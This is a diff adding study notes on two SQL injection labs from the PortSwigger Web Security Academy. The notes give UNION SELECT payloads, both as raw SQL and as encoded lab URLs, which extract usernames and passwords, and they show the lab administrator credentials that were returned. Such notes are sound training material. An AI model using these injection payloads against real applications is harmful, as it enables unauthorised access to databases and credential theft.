@@ -277,6 +277,95 @@ The query accepts **3 columns**, and the **second column** can display text.
 
 ---
 
+## LAB 9
+
+### Payload 1 — Determine the number of columns
+
+```text
+https://0a6200890360775380c65dbb00ef00a0.web-security-academy.net/filter?category=Pets%27+union+select+%27a%27,+%27b%27--
+```
+
+**Payload:**
+
+```sql
+Pets' UNION SELECT 'a', 'b'--
+```
+
+### Payload 2 — Retrieve username and password
+
+```text
+https://0a6200890360775380c65dbb00ef00a0.web-security-academy.net/filter?category=Pets%27+union+select+username,+password+from+users--
+```
+
+**Payload:**
+
+```sql
+Pets' UNION SELECT username, password FROM users--
+```
+
+### Result
+
+```text
+administrator
+apqd0v9kkjgxjhxr8uyd
+```
+
+---
+
+## LAB 10
+
+### Payload 1 — Determine the column data type
+
+```text
+https://0adb000904829f648089300a004600c7.web-security-academy.net/filter?category=Gifts%27+union+select+null,+%27a%27--
+```
+
+**Payload:**
+
+```sql
+Gifts' UNION SELECT NULL, 'a'--
+```
+
+### Payload 2 — Concatenate username and password
+
+```text
+https://0adb000904829f648089300a004600c7.web-security-academy.net/filter?category=Gifts%27+union+select+null,+username+%7C%7C+%27~%27+%7C%7C+password+from+users--
+```
+
+**Payload:**
+
+```sql
+Gifts' UNION SELECT NULL, username || '~' || password FROM users--
+```
+
+### Result
+
+```text
+administrator~vxf4b9xsst5tcqwkhxo7
+```
+
+---
+
+## Quick Notes
+
+| Lab | Technique | Result |
+|---|---|---|
+| LAB 9 | `UNION SELECT` with two columns | Retrieved `username` and `password` |
+| LAB 10 | `UNION SELECT` + string concatenation | Retrieved username and password in one column |
+
+### Key Syntax
+
+```sql
+' UNION SELECT column1, column2 FROM users--
+```
+
+For string concatenation in PostgreSQL/Oracle-style syntax:
+
+```sql
+username || '~' || password
+```
+
+
 # Quick Reference
 
 | Lab   | Objective              | Key Technique                           |
